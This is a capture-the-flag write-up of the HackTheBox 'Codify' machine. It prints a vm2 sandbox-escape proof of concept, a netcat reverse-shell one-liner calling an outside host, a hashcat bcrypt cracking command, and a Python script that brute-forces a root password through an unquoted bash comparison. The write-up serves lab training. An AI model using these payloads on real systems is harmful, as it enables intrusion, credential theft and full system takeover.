---
layout: post
title: HackTheBox Codify Walkthrough
image: /assets/img/blog/codify/nodejs.png
accent_image: 
  background: url('/assets/img/blog/codify/nodejs.png') center/cover
  overlay: false
accent_color: '#ccc'
theme_color: '#ccc'
description: >
  In this post you will find a step by step resolution walkthrough of the Codify machine on HTB platform 2023.
invert_sidebar: true
---

# HackTheBox Codify Walkthrough
Codify is an easy linux machine that targets the exploitation of a vulnerable nodeJS library to escape a Sandbox environment and gain access to the host machine.
* toc
{:toc}

## Enumeration
To enumerate the machine a first nmap scan to discover the open TCP ports on the machine was performed. Also when the open ports 
were retrieved a more in depth scan including fingerprinting was issued. With the following commands:
~~~bash
# First nmap scan
sudo nmap -sS -p- --min-rate 500 --open 10.10.11.239 -Pn -n -oG recon
# Exhaustive scan of the open ports
nmap -p80,22 -sCV -Pn -n -oN openports 10.10.11.239
~~~

The results obtained by this scans showed some interesting open ports:
![800x400](/assets/img/blog/codify/nmap.png "Nmap enumeration")
* Port 80 is open and is hosting a HTTP server, Apache httpd 2.4.52 
* Port 22 is open and from the obtained banner looks like a ssh service version: OpenSSH 8.9p1

From the nmap scan we can see this is a linux machine, probably a Ubuntu distro.
## Web enumeration
As there are only two ports open and ssh is often not vulnerable by itself, we started enmumeration via TCP 80 port. First fingerprinting the website returns similar information as the obtained executing the nmap scripts. 
Moving on and visiting the website we obtain the main functionality of the site. A module that allows you to test your Node.js code in a sandbox environment and display the output. This looks promissing.
![800x400](/assets/img/blog/codify/nodetester.png "NodeJS code tester")
Further inspection of the available pages we find that there are some limitations explained at `http://codify.htb/limitations`, this looks like there is some kind of sanitization to avoid system command execution. 
Also a list of the available libraries is shown. Cool, we take note. 📝📝 
![800x400](/assets/img/blog/codify/nodesanity.png "NodeJS Sanitization")
On the other hand an about us page was found and there was something revealing how the aplication is handeling the nodeJS code testing. On the last paragraph we could read:
> The vm2 library is a widely used and trusted tool for sandboxing JavaScript. It adds an extra layer of security to prevent potentially harmful code from causing harm to your system.
{:.lead}
Also a link to the github page of the library is present, revealing the use of the version 3.9.16, again noted 📝📝.
![800x400](/assets/img/blog/codify/vm2.png "VM2")

Checking for known vulnerabilities for the node library we found a post on github ([https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244)) 
revealing a vuln on the `handleException()` function which can be used to escape the sandbox and run arbitrary code for `vm2<=3.9.16`, this looks promissing.
The vulnerable code looks like:
~~~js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('<evil command>');
}
`
console.log(vm.run(code));
~~~
After injecting some "testing" code as a `whoami` or an `ifconfig` we got `Remote Command Execution`. Great! We now can try to get a reverse shell.
![800x400](/assets/img/blog/codify/rce.png "Remote Command Execution")
## Getting a foothold
As we have RCE we set a nc listener and used the following payload:
~~~bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 443 >/tmp/f
~~~
![800x400](/assets/img/blog/codify/nc.png "Reverse shell")

Great we are inside! 😈😈

We are inside but it looks like `svc` user cannot do much. Taking into account there is another user present called `Joshua`, it is possible we need to gain access as him to further enumerate.

## User Pivoting
Most of the times on website folders there are configuration or juicy files that can contain leaked sensitive data. After reviewing the `/var/www/contact` folder we found a tickets.db sqlite database file.
![800x400](/assets/img/blog/codify/db.png ".DB juicy file")

At this point, we could have displayed some of its info directly with the strings command, but to inspect the file in a more visual way, the file was transferred to our machine and displayed with the GUI DBeaver tool. 
After importing the database, two tables were present, tickets and users. Tickets didn't provide any interesting info but users displayed what looks like the hashed credentials of `Joshua`.
![800x400](/assets/img/blog/codify/userdb.png "DBeaver analysis")

To check which hash type is the password encrypted as, a tool named `hashid` was used. The output revealed some probable hashes.
~~~bash
hashid <hash>
~~~
![800x400](/assets/img/blog/codify/hashid.png "Hashid output")

After storing the hash on a file, we tried to crack it with hashcat using a dictionary attack specifying the bcrypt mode and the `rockyou` wordlist. 
~~~bash
hashcat -m 3200 joshua_hash /usr/share/wordlists/rockyou.txt
~~~
![800x400](/assets/img/blog/codify/hashcat.png "Hashcat cracking")
After a couple minutes boom💥💥!!!! The hash was cracked and the password was obtained... (Joshua if you are reading this, use strong passwords!).

Now trying the creds on the system led to a user pivoting and we turned ourselves into joshua.
![800x400](/assets/img/blog/codify/sujoshua.png "Joshua pivoting")

At this point we got the flag located at `/home/joshua/user.txt`
## Privilege Escalation
Looking at our privileges as the user Joshua we checked if he could execute any file with `sudo permissions` as:
~~~bash
sudo -l
~~~
![800x400](/assets/img/blog/codify/sudo.png "Sudo output")

As we can see joshua can exeute a .sh script as the user root. If the script has something we can exploit we probably can get root access.

After reviewing the script, I discovered an unsafe practice: `unquoted variable comparison`. If the right side of the == in a bash script is not quoted, Bash will perform pattern matching instead of treating it as a string.
In this context, with the pattern {valid_password_char}{*}, any character followed by any number of characters can potentially match.
Exploiting this pattern, we could try to bruteforce the root password.

To do this the following python script was created:
~~~python
import string
import subprocess

all_characters = string.ascii_letters + string.digits
password = ""
found = False

while not found:
    for character in all_characters:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, capture_output=True, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True
~~~

After executing the script we obtained the root password.

![800x400](/assets/img/blog/codify/root.png "Root pivoting")

At this point we successfully pwned the machine and we have got complete control of the system 💀💀💀

Last but not least we retrieved the flag located at `/root/root.txt`
